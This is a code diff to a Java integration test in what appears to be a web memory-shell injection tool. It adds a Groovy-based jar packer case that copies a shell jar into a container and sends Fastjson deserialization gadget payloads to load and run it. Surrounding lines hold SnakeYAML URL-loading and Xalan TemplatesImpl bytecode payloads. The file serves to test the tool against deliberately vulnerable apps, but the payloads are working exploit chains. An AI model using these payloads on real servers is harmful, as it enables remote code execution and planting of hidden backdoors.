@@ -11,10 +11,7 @@ import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.*;
 import com.reajason.javaweb.packer.JarPacker;
 import com.reajason.javaweb.packer.Packers;
-import com.reajason.javaweb.packer.jar.AgentJarPacker;
-import com.reajason.javaweb.packer.jar.AgentJarWithJDKAttacherPacker;
-import com.reajason.javaweb.packer.jar.AgentJarWithJREAttacherPacker;
-import com.reajason.javaweb.packer.jar.ScriptEngineJarPacker;
+import com.reajason.javaweb.packer.jar.*;
 import com.reajason.javaweb.packer.translet.XalanAbstractTransletPacker;
 import com.reajason.javaweb.suo5.Suo5Manager;
 import lombok.SneakyThrows;
@@ -129,6 +126,30 @@ public class ShellAssertion {
                     "    !!java.net.URL [\"file://" + jarPath + "\"]\n" +
                     "  ]]\n" +
                     "]";
+        } else if (packer.getInstance() instanceof GroovyTransformJarPacker) {
+            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
+            Path tempJar = Files.createTempFile("temp", "jar");
+            Files.write(tempJar, bytes);
+            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
+            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
+            FileUtils.deleteQuietly(tempJar.toFile());
+            VulTool.postIsOk(url + "/fastjson", """
+                    {
+                      "@type":"java.lang.Exception",
+                      "@type":"org.codehaus.groovy.control.CompilationFailedException",
+                      "unit":{
+                      }
+                    }""");
+            content = "{\n" +
+                    "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
+                    "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
+                    "  \"config\":{\n" +
+                    "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
+                    "    \"classpathList\":[\"file://" + jarPath + "\"]\n" +
+                    "  },\n" +
+                    "  \"gcl\":null,\n" +
+                    "  \"destDir\": \"/tmp\"\n" +
+                    "}";
         } else if (packer.getInstance() instanceof XalanAbstractTransletPacker) {
             String bytes = packer.getInstance().pack(generateResult.toClassPackerConfig());
             content = "[\"org.apache.xalan.xsltc.trax.TemplatesImpl\",{\"transletName\":\"businessObject\",\"transletBytecodes\":[\"" + bytes + "\"],\"outputProperties\":{}}]";
@@ -396,6 +417,7 @@ public class ShellAssertion {
             case HessianDeserialize -> VulTool.postIsOk(url + "/hessian", content);
             case Hessian2Deserialize -> VulTool.postIsOk(url + "/hessian2", content);
             case ScriptEngineJar -> VulTool.postIsOk(url + "/snakeYaml", content);
+            case GroovyTransformJar -> VulTool.postIsOk(url + "/fastjson", content);
             case XMLDecoderScriptEngine, XMLDecoderDefineClass -> VulTool.postIsOk(url + "/xmlDecoder", content);
             case Base64 -> VulTool.postIsOk(url + "/b64", content);
             case BigInteger -> VulTool.postIsOk(url + "/biginteger", content);
